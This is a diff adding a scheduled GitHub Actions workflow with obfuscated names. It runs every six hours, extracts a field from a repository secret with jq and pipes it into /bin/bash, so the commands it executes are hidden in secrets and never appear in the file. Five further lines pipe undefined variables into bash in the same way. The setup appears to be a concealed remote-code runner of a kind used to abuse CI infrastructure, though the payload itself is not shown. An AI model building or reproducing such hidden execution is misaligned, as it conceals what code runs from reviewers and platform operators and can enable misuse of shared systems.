@@ -1,0 +1,23 @@
+name: tianhoushuodaoo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianhoushuodaoo
+        env:
+          zguog5881: ${{ secrets.zguog5881 }}
+        run: |
+          echo $zguog5881 | jq -r .zgoj44016 | /bin/bash
+          echo $uxo00688 | jq -r .pbp0771 | /bin/bash
+          echo $p9778 | jq -r .cs05 | /bin/bash
+          echo $vlpmv3 | jq -r .bat9275 | /bin/bash
+          echo $pylw02561 | jq -r .zzu5 | /bin/bash
+          echo $oll7238 | jq -r .cuv445 | /bin/bash
+
